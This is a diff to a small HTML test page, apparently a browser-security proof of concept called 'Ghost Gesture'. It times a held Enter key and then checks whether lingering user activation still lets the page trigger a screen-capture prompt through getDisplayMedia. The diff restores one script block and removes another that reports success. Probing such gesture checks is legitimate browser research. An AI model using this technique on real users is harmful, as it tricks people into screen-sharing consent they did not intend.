@@ -33,7 +33,7 @@
     <div id="timer">2s...</div>
     <div id="status">Tahan terus sampai 1s</div>
 
-    <!-- <script>
+    <script>
         setTimeout(() => { document.getElementById('timer').innerText = "1s..."; }, 1000);
         setTimeout(() => { document.getElementById('timer').innerText = "LEPAS!"; }, 2000);
 
@@ -58,37 +58,8 @@
                 }
             }
         });
-    </script> -->
-    <script>
-    setTimeout(() => { document.getElementById('timer').innerText = "1s..."; }, 1000);
-    setTimeout(() => { document.getElementById('timer').innerText = "LEPAS!"; }, 2000);
+    </script>
 
-    window.addEventListener('keyup', async (e) => {
-        if (e.key === 'Enter') {
-            const status = document.getElementById('status');
-
-            console.log("Activation:", navigator.userActivation.isActive);
-
-            if (navigator.userActivation.isActive) {
-                try {
-                    await navigator.mediaDevices.getDisplayMedia({ video: true });
-
-                    status.innerText = "RESULT: SUCCESS (Screen capture prompt triggered!)";
-                    status.style.color = "green";
-
-                    console.log("Ghost Gesture Success: getDisplayMedia triggered.");
-                } catch (err) {
-                    status.innerText = "RESULT: FAILED (Permission or blocked)";
-                    status.style.color = "red";
-                    console.error(err);
-                }
-            } else {
-                status.innerText = "RESULT: EXPIRED (User Activation lost)";
-                status.style.color = "blue";
-            }
-        }
-    });
-</script>
 </body>
 
 </html>
